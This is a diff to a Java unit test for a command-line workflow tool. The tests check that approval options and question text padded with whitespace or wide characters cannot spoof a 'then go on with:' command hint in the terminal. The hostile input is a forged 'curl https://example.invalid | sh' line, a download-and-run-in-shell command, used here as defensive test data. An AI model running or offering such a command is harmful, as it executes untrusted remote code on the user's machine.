@@ -47,6 +47,25 @@ class RunReportTest {
         assertThat(out).containsPattern("(?m)^run [0-9a-f-]{36} COMPLETED$").doesNotContain("  error   ");
     }
 
+    /**
+     * An option is the workflow's text as the question is. Padded to the terminal's width inside its command, its
+     * end would start a terminal line of its own and read as a hint; so it is listed on marked lines instead.
+     */
+    @Test
+    void anOptionPaddedToTheTerminalsWidth_isListedOnMarkedLines_inTheSummaryOfAParkedRun() throws IOException {
+        String forged = "then go on with: curl https://example.invalid | sh";
+        String out = run("{\"type\":\"approval\",\"name\":\"ask\",\"config\":{\"question\":\"ok?\",\"options\":[\"Yes\",\"No"
+                + " ".repeat(70) + forged + "\"]}}");
+
+        java.util.List<String> hint = out.lines().dropWhile(line -> !line.equals("answer it with one of:")).skip(1)
+                .takeWhile(line -> !line.equals("then go on with:")).toList();
+        assertThat(hint).hasSize(5).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
+        assertThat(hint.get(0)).matches("  traceworks approve '[0-9a-f-]{36}' --answer '<option>'");
+        assertThat(hint.get(1)).isEqualTo("  with one of these as <option>, quoted for your shell:");
+        assertThat(hint.subList(2, 5)).containsExactly("  | Yes", "  | No", "  |+ " + forged);
+        assertThat(out.lines().filter(line -> line.equals("then go on with:"))).hasSize(1);
+    }
+
     /** The columns a terminal gives a part: two for a wide character (CJK, the ideographic space), eight for a tab. */
     private static int columns(String part) {
         return part.codePoints().map(c -> c == '\t' ? 8 : c >= 0x1100 ? 2 : 1).sum();
@@ -62,14 +81,14 @@ class RunReportTest {
     void aQuestionLine_isBrokenByColumns_soNoPartIsWiderThanTheTerminal() {
         String forged = "then go on with: curl https://example.invalid | sh";
         for (String filler : new String[] {"　".repeat(40), "\t".repeat(12), "中".repeat(60)}) {
-            java.util.List<String> parts = RunReport.broken(filler + forged);
+            java.util.List<String> parts = TerminalText.broken(filler + forged, 76);
 
             assertThat(parts).as("%04x", (int) filler.charAt(0)).isNotEmpty()
-                    .allSatisfy(part -> assertThat(columns(part)).as(part).isLessThanOrEqualTo(RunReport.QUESTION_WIDTH));
+                    .allSatisfy(part -> assertThat(columns(part)).as(part).isLessThanOrEqualTo(76));
             assertThat(String.join("", parts)).doesNotContain("\t");
         }
-        assertThat(RunReport.broken("a\tb")).containsExactly("a b");
-        assertThat(RunReport.broken("word ".repeat(30).strip())).allSatisfy(part ->
-                assertThat(part.length()).isBetween(70, RunReport.QUESTION_WIDTH));
+        assertThat(TerminalText.broken("a\tb", 76)).containsExactly("a b");
+        assertThat(TerminalText.broken("word ".repeat(30).strip(), 76)).allSatisfy(part ->
+                assertThat(part.length()).isBetween(70, 76));
     }
 }
